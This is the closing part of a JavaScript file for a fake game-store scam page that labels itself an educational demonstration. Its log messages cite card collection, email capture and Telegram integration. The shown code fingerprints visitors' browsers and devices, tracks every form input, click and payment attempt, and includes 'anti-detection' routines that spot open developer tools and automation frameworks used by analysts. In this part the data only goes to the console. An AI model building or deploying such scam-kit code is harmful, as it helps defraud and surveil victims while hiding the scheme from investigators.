        userAgent: navigator.userAgent,
        location: userLocationData,
        viewport: {
            width: window.innerWidth,
            height: window.innerHeight
        }
    };
    
    console.log(`📊 User Behavior (Educational Demo): ${event}`, behaviorData);
    
    // In a real scam, this would be sent to analytics servers
    return behaviorData;
}

function monitorPagePerformance() {
    if ('performance' in window) {
        const perfData = {
            // Page load metrics
            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
            domInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
            
            // Resource metrics
            resourceCount: performance.getEntriesByType('resource').length,
            
            // Custom metrics
            scriptsLoaded: document.querySelectorAll('script').length,
            stylesLoaded: document.querySelectorAll('link[rel="stylesheet"]').length,
            
            // Scam-specific metrics
            locationDataLoaded: userLocationData.ip !== 'Unknown',
            countriesLoaded: countriesLoaded,
            zipValidationReady: typeof validateZipCodeByCountry !== 'undefined',
            
            // Browser capabilities
            browserFeatures: {
                localStorage: typeof(Storage) !== 'undefined',
                sessionStorage: typeof(Storage) !== 'undefined',
                geolocation: 'geolocation' in navigator,
                clipboard: 'clipboard' in navigator,
                notifications: 'Notification' in window
            }
        };
        
        console.log('📈 Performance Metrics (Educational Demo):', perfData);
        return perfData;
    }
    
    return null;
}

// ====================================================================
// USER ENGAGEMENT TRACKING
// ====================================================================
let userEngagementData = {
    pageViews: 1,
    timeOnPage: 0,
    clicks: 0,
    formInteractions: 0,
    modalOpens: 0,
    emailProvided: false,
    paymentAttempts: 0,
    retryAttempts: 0,
    supportContacts: 0
};

function trackEngagement(action, details = {}) {
    switch (action) {
        case 'click':
            userEngagementData.clicks++;
            break;
        case 'form_interaction':
            userEngagementData.formInteractions++;
            break;
        case 'modal_open':
            userEngagementData.modalOpens++;
            break;
        case 'email_provided':
            userEngagementData.emailProvided = true;
            break;
        case 'payment_attempt':
            userEngagementData.paymentAttempts++;
            break;
        case 'retry_attempt':
            userEngagementData.retryAttempts++;
            break;
        case 'support_contact':
            userEngagementData.supportContacts++;
            break;
    }
    
    userEngagementData.timeOnPage = Math.round(performance.now() / 1000);
    
    console.log(`🎯 Engagement: ${action}`, { ...userEngagementData, details });
    
    // Track critical engagement milestones
    if (action === 'email_provided') {
        trackUserBehavior('EMAIL_CONVERSION', { email: userPaymentData.email });
    } else if (action === 'payment_attempt') {
        trackUserBehavior('PAYMENT_ATTEMPT', { attempt: userEngagementData.paymentAttempts });
    }
}

// ====================================================================
// DEVICE AND BROWSER DETECTION
// ====================================================================
function detectUserEnvironment() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    const environment = {
        // Operating System
        os: {
            windows: userAgent.includes('windows'),
            mac: userAgent.includes('mac'),
            linux: userAgent.includes('linux'),
            android: userAgent.includes('android'),
            ios: userAgent.includes('iphone') || userAgent.includes('ipad'),
        },
        
        // Browser
        browser: {
            chrome: userAgent.includes('chrome') && !userAgent.includes('edge'),
            firefox: userAgent.includes('firefox'),
            safari: userAgent.includes('safari') && !userAgent.includes('chrome'),
            edge: userAgent.includes('edge'),
            opera: userAgent.includes('opera'),
        },
        
        // Device type
        device: {
            mobile: /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent),
            tablet: /ipad|android(?!.*mobile)/i.test(userAgent),
            desktop: !/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent),
        },
        
        // Screen info
        screen: {
            width: screen.width,
            height: screen.height,
            pixelRatio: window.devicePixelRatio || 1,
            colorDepth: screen.colorDepth,
            orientation: screen.orientation?.type || 'unknown'
        },
        
        // Browser capabilities
        capabilities: {
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            language: navigator.language,
            languages: navigator.languages,
            onLine: navigator.onLine,
            platform: navigator.platform,
            vendor: navigator.vendor
        }
    };
    
    console.log('🖥️ User Environment (Educational Demo):', environment);
    return environment;
}

// ====================================================================
// FORM INTERACTION TRACKING
// ====================================================================
function initializeFormTracking() {
    // Track all input interactions
    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
            trackEngagement('form_interaction', {
                field: e.target.id || e.target.name || e.target.type,
                value_length: e.target.value ? e.target.value.length : 0
            });
        }
    });
    
    // Track focus events
    document.addEventListener('focus', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
            trackUserBehavior('FIELD_FOCUS', {
                field: e.target.id || e.target.name || e.target.type
            });
        }
    }, true);
    
    // Track all clicks
    document.addEventListener('click', function(e) {
        trackEngagement('click', {
            element: e.target.tagName,
            class: e.target.className,
            id: e.target.id,
            text: e.target.textContent?.substring(0, 50) || ''
        });
    });
}

// ====================================================================
// ANTI-DETECTION MEASURES (EDUCATIONAL)
// ====================================================================
function initializeAntiDetection() {
    // Detect if developer tools are open (basic detection)
    let devtools = false;
    setInterval(() => {
        const start = performance.now();
        console.log('Security check');
        const end = performance.now();
        
        if (end - start > 100) {
            if (!devtools) {
                devtools = true;
                console.log('⚠️ Developer tools detected (Educational Demo)');
                trackUserBehavior('DEVTOOLS_DETECTED');
            }
        } else {
            devtools = false;
        }
    }, 1000);
    
    // Detect automation/bots (basic checks)
    const automationSignals = [
        navigator.webdriver,
        window.phantom,
        window._phantom,
        window.callPhantom,
        window.__nightmare,
        window.emit
    ];
    
    const automationDetected = automationSignals.some(signal => signal);
    if (automationDetected) {
        console.log('🤖 Automation detected (Educational Demo)');
        trackUserBehavior('AUTOMATION_DETECTED');
    }
    
    // Mouse movement tracking (simplified)
    let mouseMovements = 0;
    document.addEventListener('mousemove', () => {
        mouseMovements++;
        if (mouseMovements === 10) { // After some movement
            trackUserBehavior('HUMAN_MOVEMENT_DETECTED');
        }
    });
}

// ====================================================================
// SESSION AND EXIT TRACKING
// ====================================================================
function initializeSessionTracking() {
    // Track page visibility changes
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            trackUserBehavior('PAGE_HIDDEN', { timeOnPage: Math.round(performance.now() / 1000) });
        } else {
            trackUserBehavior('PAGE_VISIBLE');
        }
    });
    
    // Track page unload (user leaving)
    window.addEventListener('beforeunload', function() {
        const sessionSummary = {
            ...userEngagementData,
            finalTimeOnPage: Math.round(performance.now() / 1000),
            locationData: userLocationData,
            environment: detectUserEnvironment()
        };
        
        console.log('👋 Session End (Educational Demo):', sessionSummary);
    });
    
    // Track tab focus/blur
    window.addEventListener('focus', () => trackUserBehavior('WINDOW_FOCUS'));
    window.addEventListener('blur', () => trackUserBehavior('WINDOW_BLUR'));
}

// ====================================================================
// INITIALIZE ALL TRACKING AND MONITORING
// ====================================================================
function initializeCompleteTracking() {
    // Initialize all tracking systems
    initializeFormTracking();
    initializeAntiDetection();
    initializeSessionTracking();
    
    // Detect and log user environment
    detectUserEnvironment();
    
    // Start periodic performance monitoring
    setInterval(() => {
        monitorPagePerformance();
    }, 30000); // Every 30 seconds
    
    console.log('📊 Complete tracking system initialized');
}

// ====================================================================
// FINAL INITIALIZATION
// ====================================================================
// Initialize tracking after a delay to not interfere with page load
setTimeout(() => {
    initializeCompleteTracking();
}, 3000);

// Show final load message
setTimeout(() => {
    console.log('🎮 Game Page Loaded Successfully!');
    console.log('📊 Features Active: 2-Step Payment Modal, Email Collection, Card Validation, Telegram Integration');
    console.log('🌍 NEW: IP Geolocation tracking with comprehensive location data');
    console.log('📮 ENHANCED: Country-specific zip code validation for 50+ countries');
    console.log('🎯 NEW: Real-time zip code formatting and validation');
    console.log('💳 NEW: Realistic payment processing with professional failure handling');
    console.log('🎭 Educational scam demonstration - All data collection methods active');
    console.log('⚠️ Educational Purpose: Demonstrates advanced scammer data collection techniques');
    console.log('✅ ALL PARTS COMPLETE: Full enhanced system ready for demonstration');
}, 2000);

// ====================================================================
// DEVELOPMENT AND TESTING UTILITIES
// ====================================================================
window.debugScamDemo = {
    // Data inspection
    getUserData: () => ({ userPaymentData, userLocationData, userEngagementData }),
    getFormState: () => formValidationState,
    getCountries: () => worldCountries,
    
    // Testing functions
    testZipValidation: testZipCodeValidation,
    testZipFormatting: testZipCodeFormatting,
    
    // Manual triggers
    showEmailModal: (game = 'Test Game', price = '4.99', original = '29.99') => showEmailModal(game, price, original),
    showPaymentModal: () => showFullPaymentModal(),
    showNotification: (msg, type) => showNotification(msg, type),
    
    // Analytics
    trackBehavior: trackUserBehavior,
    trackEngagement: trackEngagement,
    
    // Utilities
    copyCode: (code) => copyToClipboard(code),
    generateCode: generateGiftCode
};

// Make debug available in console for development
if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    console.log('🛠️ Development mode: window.debugScamDemo available');
    console.log('🧪 Try: debugScamDemo.showEmailModal() or debugScamDemo.testZipValidation()');
}

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 8 LOADED: Utility Functions & Helpers');
console.log('🔔 Loaded: Enhanced notification system with animations');
console.log('📋 Loaded: Clipboard utilities and gift code generation');
console.log('📊 Loaded: Performance monitoring and user behavior tracking');
console.log('🖥️ Loaded: Device/browser detection and environment analysis');
console.log('🔒 Loaded: Anti-detection measures and automation detection');
console.log('📈 Loaded: Session tracking and engagement analytics');
console.log('🛠️ Loaded: Development utilities and debug functions');

console.log('✅ ALL 8 PARTS COMPLETE: Enhanced script system fully loaded!');

